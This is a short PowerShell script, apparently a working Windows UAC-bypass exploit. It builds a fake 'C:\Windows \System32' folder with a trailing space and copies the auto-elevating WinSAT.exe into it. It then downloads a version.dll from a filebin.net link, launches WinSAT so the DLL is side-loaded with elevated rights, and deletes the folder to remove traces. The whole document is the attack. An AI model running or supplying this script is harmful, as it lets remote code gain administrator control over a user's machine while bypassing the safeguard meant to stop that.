New-Item '\\?\C:\Windows \System32' -ItemType Directory
Set-Location -Path '\\?\C:\Windows \System32'
copy C:\Windows\System32\WinSAT.exe "C:\windows \System32\winSAT.exe"
Invoke-WebRequest -Uri 'https://filebin.net/xlbsezltjby3hgz7/version.dll' -OutFile 'version.dll'
Start-Process -Filepath 'C:\windows \System32\winSAT.exe'
Start-Sleep -s 1
Remove-Item '\\?\C:\Windows \' -Force -Recurse